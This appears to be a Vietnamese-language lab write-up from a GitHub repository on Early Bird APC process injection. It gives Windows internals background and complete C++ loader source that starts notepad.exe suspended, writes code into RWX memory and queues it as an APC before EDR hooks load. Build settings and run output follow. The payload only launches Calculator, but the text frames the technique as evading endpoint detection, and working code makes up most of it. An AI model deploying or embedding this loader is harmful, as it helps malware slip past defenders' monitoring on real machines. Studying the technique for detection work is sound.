
---

# 📝 [PE 12] Early Bird Injection

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Early Bird Injection** đại diện cho phân hệ tối ưu hóa nâng cao từ kỹ thuật can thiệp hàng đợi bất đồng bộ truyền thống (APC Injection - PE 11), thuộc nhóm giải thuật **Né tránh phòng thủ động tầng sâu dựa trên vòng đời sơ khởi của tiến trình (Early Lifecycle Evasion)**.

Trong các cuộc đối đầu thực tế với giải pháp Endpoint Detection and Response (EDR) hiện đại, nếu Loader phát lệnh triệu hồi API `QueueUserAPC` nhắm vào một luồng thực thi đang vận hành của một tiến trình đã hoạt động lâu, hành vi này rất dễ bị bẫy Hook giám sát động ghi nhận nhật ký (Telemetry Log) và chặn đứng.

Giải thuật `Early Bird` hóa giải bài toán sinh tử này bằng cách chủ động can thiệp vào **giai đoạn khởi thủy nguyên bản của vòng đời tiến trình (Process Initialization Phase)**. Bằng cách khởi tạo một tiến trình vỏ bọc (văn cảnh thực nghiệm: `notepad.exe`) ở trạng thái đóng băng hệ thống (`CREATE_SUSPENDED`), Loader thực hiện gài mã máy vào hàng đợi APC của luồng chính trước khi bất kỳ một phân hệ giám sát hành vi hay tệp tin DLL Hooks nào của EDR kịp nạp và can thiệp cấu trúc vào không gian ảo của nạn nhân.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cơ chế Dynamic Hooking**: Triệt tiêu khả năng phát hiện của các bộ quét hành vi động bằng cách thực thi Payload trước khi hàng rào an ninh User-mode được thiết lập.
* **Khai thác đặc tính ưu tiên lập lịch**: Nghiên cứu quy trình nhân Kernel xử lý hàng đợi cấu trúc `KAPC` khi giải phóng trạng thái đóng băng luồng chính.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một tiến trình được sinh ra đi kèm cờ cấu hình đặc quyền `CREATE_SUSPENDED`, Windows Kernel sẽ chịu trách nhiệm thiết lập các cấu trúc quản lý cơ bản (như cấu trúc PEB, EPROCESS, ETHREAD) nhưng hoãn lại thủ tục ánh xạ và nạp mã máy chính thức của ứng dụng. Tại tích lửng thời gian này, không gian địa chỉ ảo của tiến trình mục tiêu nằm trong trạng thái "nguyên thủy nguyên bản", hoàn toàn vắng bóng các mô-đun giám sát của bên thứ ba (EDR DLLs).

Quy trình phẫu thuật và điều phối dòng chảy CPU của giải thuật Early Bird diễn ra qua 4 giai đoạn ngầm tại nhân Kernel:

```
[CreateProcessW: Khởi tạo tiến trình nguyên thủy mang cờ CREATE_SUSPENDED]
       └──> [VirtualAllocEx: Phân bổ và nạp Payload PIC sang RAM đối phương]
                 └──> [QueueUserAPC: Chèn cấu trúc KAPC vào đỉnh hàng đợi luồng chính]
                           └──> [ResumeThread: Kernel giải tỏa hàng đợi APC trước khi nạp EDR]

```

1. **Khóa chân luồng tại vạch xuất phát (`CREATE_SUSPENDED`)**: Trình quản lý tiến trình của OS ánh xạ file PE lên RAM nhưng chặn luồng chính không cho chạy qua điểm chỉ mục lệnh EntryPoint hệ thống. Do đó, các hàm hook User-mode nhạy cảm của EDR hoàn toàn chưa được gài vào tháp API.
2. **Gài bẫy bất đồng bộ sơ khởi (`QueueUserAPC`)**: Loader đẩy khối mã máy thực thi độc lập vị trí (PIC) cùng bảng tham số tuyệt đối toán học sang phân vùng không gian ảo của nạn nhân, sau đó triệu hồi `QueueUserAPC`. Nhân Kernel Windows tiếp nhận, khởi tạo cấu trúc `KAPC` và gài trực tiếp vào đỉnh hàng đợi APC thuộc cấu trúc quản lý luồng chính `pi.hThread`.
3. **Chiếm quyền ưu tiên tuyệt đối từ Kernel (`ResumeThread`)**: Ngay khi Loader phát lệnh rã đông luồng, trình lập lịch CPU (Scheduler) thức tỉnh luồng chính. Theo đặc tính thiết kế cốt lõi của Windows Subsystem, trước khi luồng chính được phép nhảy vào mã máy gốc của tệp nhị phân (hoặc thực thi các hàm callback khởi tạo DLL của EDR lọt lòng `LdrpInitializeProcess`), Kernel bắt buộc phải kiểm tra và giải tỏa toàn bộ thông điệp tồn đọng trong hàng đợi APC Queue trước. Hệ quả là, con trỏ lệnh **`Rip`** bị cưỡng bức dịch chuyển sang phân vùng Payload của Loader để CPU rút lệnh xử lý trước tiên, đạt độ né tránh tuyệt đối kịch trần kịch khung.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm gánh logic thực thi độc lập vị trí khi luồng chính thức thức dậy
DWORD WINAPI EarlyBirdApcPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối tuyệt đối, né sạch lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật tự động định vị vị trí thư mục hệ thống thực tế (Zero Static Buffers)
std::wstring GetActiveSystemTarget(const std::wstring& exeName) {
    // Bước 1: Truyền con trỏ NULL để OS tự tính kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng vừa vặn đến từng byte để hứng chuỗi
    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình vỏ bọc
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 12: EARLY BIRD CODE INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng
    std::wstring targetExeName = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemTarget(targetExeName);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HOÀN TOÀN ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang (CREATE_SUSPENDED)..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()), // Nạp chuỗi đường dẫn chủ động thích ứng
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ chặt luồng ngay vạch xuất phát trước khi EDR kịp chèn Hook
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] CreateProcessW failed. Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao thanh cong! PID: " << pi.dwProcessId << " | ThreadID: " << pi.dwThreadId << std::endl;

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít đến từng byte
    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT BỘ NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 3: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY SANG RAM NOTEPAD ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy linh hồn mã máy và tham số tuyệt đối vào lòng Notepad từ xa
    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)EarlyBirdApcPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va tham so vao xac rong hoan tat." << std::endl;

    // ─── BƯỚC 4: CHIẾN THUẬT CHIM NON - GÀI ĐỊA CHỈ VÀO HÀNG ĐỢI APC LUỒNG CHÍNH ───
    std::cout << "[*] Dang gai ham vao hang doi QueueUserAPC cua luong chinh..." << std::endl;
    DWORD apcStatus = QueueUserAPC((PAPCFUNC)remoteCodeBuffer, pi.hThread, (ULONG_PTR)pRemoteData);

    if (apcStatus == 0) {
        std::cerr << "[-] QueueUserAPC failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, pRemoteData, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Gai hang doi APC Early Bird thanh cong!" << std::endl;

    // ─── BƯỚC 5: RÃ ĐÔNG LUỒNG CHÍNH ĐỂ TIẾN TRÌNH TỰ ĐỘNG KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread). He dieu hanh thuc day tu dong loi APC thuc thi..." << std::endl;
    ResumeThread(pi.hThread);

    // Sử dụng cờ kết thúc đồng bộ, dọn dẹp phẳng sạch tài nguyên
    std::cout << "\n[+] Early Bird Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so va don dep tai nguyen..." << std::endl;
    std::cin.get();

    // Thu hồi Handle hệ thống phẳng sạch chống rò rỉ tài nguyên
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file nhị phân xuất bản vận hành mượt mà độc lập, loại bỏ hoàn toàn các chỉ dấu cảnh báo tĩnh phụ thuộc vào thư viện liên kết động bọc ngoài:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập thanh cấu hình quản lý dự án ở chính xác chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, lật cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tệp nhị phân thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để giám sát quy trình điều phối chu kỳ sống sơ khởi chéo RAM:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE12_EarlyBird_Code_Injection\x64\Release>C:\Users\Admin\source\repos\Task6\PE12_EarlyBird_Code_Injection\x64\Release\EarlyBird_Code_Injection.exe
====================================================
[*] PE 12: EARLY BIRD CODE INJECTION
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang (CREATE_SUSPENDED)...
[+] Tien trinh vo boc duoc tao thanh cong! PID: 3960 | ThreadID: 13200
[+] Vung nho Code RWX cua payload dat tai: 0x0000026FC4670000
[+] Anh xa logic ham va tham so vao xac rong hoan tat.
[*] Dang gai ham vao hang doi QueueUserAPC cua luong chinh...
[+] Gai hang doi APC Early Bird thanh cong!
[*] Kich hoat ra dong (ResumeThread). He dieu hanh thuc day tu dong loi APC thuc thi...

[+] Early Bird Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so va don dep tai nguyen...

```

### Demo:
<img width="1920" height="600" alt="devenv_XoUYtdZY4M" src="https://github.com/user-attachments/assets/8378e13f-335f-4642-835a-66b0266ff1c1" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Documentation**: *Asynchronous Procedure Calls (APCs)* - [https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
* **Windows Internals Architecture**: *Part 1 (7th Edition)* - Chapter 3: Thread Internals and Scheduling States.
* **MDSec ActiveBreach**: *Exploring Advanced Code Injection - Early Bird Technical Review* - [https://www.mdsec.co.uk/](https://www.mdsec.co.uk/)
* **MITRE ATT&CK Framework**: *Process Injection: Asynchronous Procedure Call (T1055.004)*.

